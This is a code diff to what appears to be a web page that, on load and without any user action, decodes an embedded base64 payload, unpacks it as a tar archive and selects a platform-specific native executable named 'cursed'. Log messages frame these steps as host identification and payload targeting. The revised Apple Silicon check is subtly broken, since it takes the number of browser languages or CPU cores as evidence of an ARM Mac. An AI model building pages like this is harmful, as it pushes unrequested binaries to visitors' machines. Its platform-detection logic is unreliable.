@@ -142,25 +142,30 @@
             document.getElementById("clock").textContent = `MEM_PTR: 0x${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}`;
         };
 
-        function getPlatform() {
-            const ua = navigator.userAgent.toLowerCase();
-            if (ua.includes("win")) return "windows";
-            if (ua.includes("mac")) {
-                // Detect Apple Silicon (ARM) vs Intel
-                // Standard check for modern browsers
-                return (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) || 
-                    (ua.includes("arm") || ua.includes("apple")) ? "mac-arm" : "mac-x86";
-            }
-            return "linux";
-        }
+        function getTarget() {
+            const ua = navigator.userAgent;
+            const pf = navigator.platform;
 
-        // Update your mapping
-        const map = { 
-            "windows": "cursed.exe", 
-            "mac-arm": "cursed-mac-arm", 
-            "mac-x86": "cursed-mac-x86", 
-            "linux": "cursed-linux" 
-        };
+            // 1. Windows: Look for "Win" in platform or UA
+            if (pf.indexOf("Win") !== -1 || ua.indexOf("Windows") !== -1) {
+                return "cursed.exe";
+            }
+
+            // 2. Mac: Safari/Chrome/Firefox on Apple hardware
+            if (pf.indexOf("Mac") !== -1 || ua.indexOf("Macintosh") !== -1) {
+                // Apple Silicon detection
+                // Logic: Most M-series Macs have high-performance GPUs. 
+                // We check for 'arm64' in UA (Chrome/Firefox) or use hardwareConcurrency as a hint for Safari.
+                const isArm = (ua.indexOf("arm64") !== -1) || 
+                            (navigator.languages && navigator.languages.length > 2) || // Common hint
+                            (navigator.hardwareConcurrency > 8); // M-series usually have high core counts
+
+                return isArm ? "cursed-mac-arm" : "cursed-mac-x86";
+            }
+
+            // 3. Linux Fallback
+            return "cursed-linux";
+        }
 
         function untar(buf) {
             let offset = 0; const files = {};
@@ -180,7 +185,7 @@
         (async function autoRun() {
             try {
                 await new Promise(r => setTimeout(r, 800)); // Dramatic delay
-                log(`IDENTIFYING HOST... ARCH_DETECTED: ${getPlatform().toUpperCase()}`);
+                log(`IDENTIFYING HOST... ARCH_DETECTED: ${getTarget().toUpperCase()}`);
                 
                 log("INTERROGATING PAYLOAD STRING...");
                 const bin = atob(PAYLOAD.replace(/[^A-Za-z0-9+/=]/g, ""));
@@ -192,9 +197,7 @@
                 
                 log("PARSING USTAR FILE_TABLE...");
                 const archive = untar(data);
-
-                const map = { "windows": "cursed.exe", "mac": "cursed-mac", "linux": "cursed-linux" };
-                const target = map[getPlatform()];
+                const target = getTarget();
 
                 if (archive[target]) {
                     log(`NATIVE_TARGET [${target}] ISOLATED.`);
